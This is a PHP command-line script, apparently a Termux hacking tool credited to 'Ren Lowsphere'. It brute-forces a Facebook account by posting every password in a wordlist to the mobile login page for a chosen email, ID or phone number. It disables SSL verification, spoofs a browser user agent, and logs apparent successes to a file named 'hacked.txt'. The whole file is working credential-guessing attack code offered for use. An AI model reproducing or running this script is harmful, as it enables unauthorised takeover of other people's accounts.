<?php
$red="\033[1;31m";
 $yellow="\033[1;33m";
$lightgreen="\033[1;32m";
system("clear");
echo "
        _____
       |       |    |    |     /\       ______   |   /
       |_____  |    |    |    /  \     /         |  /
       |    __{|}__ |----|   /----\   |          |--
       |      |||   |    |  /      \  |          |  \
       |      \|/   |    | /        \  \______   |   \
               ~~~~~~>   V1.0  by Ren Lowsphere


  ";
sleep(1);
system("termux-open-url https://renlowsphere.htmlsave.net/");
$em = readline("[#]ID, Email or Phone number: ");
$filz = readline("[#]Wordlist file path:");
$fn = fopen($filz, "a+");

sleep(1);
echo" _______________________________________________\n";
sleep(1);
 while(! feof($fn))  {
    $pa = fgets($fn);
$ur = "https://m.facebook.com/login.php";
$ch = curl_init();
curl_setopt($ch, CURLOPT_REFERER,
   "https://www.facebook.com");
   $cm = "$em | $pa";//coded by Ren Lowsphere
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Accept: application/json'));
curl_setopt($ch, CURLOPT_URL, $ur);
curl_setopt($ch, CURLOPT_POSTFIELDS,'email='.urlencode($em).'&pass='.urlencode($pa).'&login=Login');
curl_setopt($ch, CURLOPT_POST, 1);
//coded by Ren Lowsphere
 curl_setopt($ch, CURLOPT_HEADER, 0);

 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
//coded by Ren Lowsphere
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
//coded by Ren Lowsphere
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Android 8.1.0; Mobile; rv:84.0) Gecko/84.0 Firefox/84.0");
curl_setopt($ch, CURLINFO_HEADER_OUT, true);
    $last = curl_exec($ch);
    $word = "c_user";
    $wor = "home";
    $wo = "checkpoint";
    $js = curl_getinfo($ch, CURLINFO_HEADER_OUT);
    //coded by Ren Lowsphere
    if(strpos($js, $word) !== false){
echo "$lightgreen[FOUND]$yellow $cm \n";
file_put_contents("hacked.txt", "$cm \n", FILE_APPEND);
    	  } //coded by Ren Lowsphere
    if(strpos($js, $wor) !== false){
echo "$lightgreen[FOUND]$yellow $cm \n";
file_put_contents("hacked.txt", "$cm \n", FILE_APPEND);
 } //coded by Ren Lowsphere
    if (strpos($js,  $wo) !== false){
echo "[$red Checkpoint $yellow]$cm \n";    }
    $r = "recover";
    if(strpos($js, $r) !== false){
echo "[$red Die $yellow]$cm \n";    }
    $ea = "email";
    if(strpos($js, $ea) !== false){
echo "[$red Die $yellow]$cm \n";    }}
    fclose($fn);
    system("cat hacked.txt");
?>
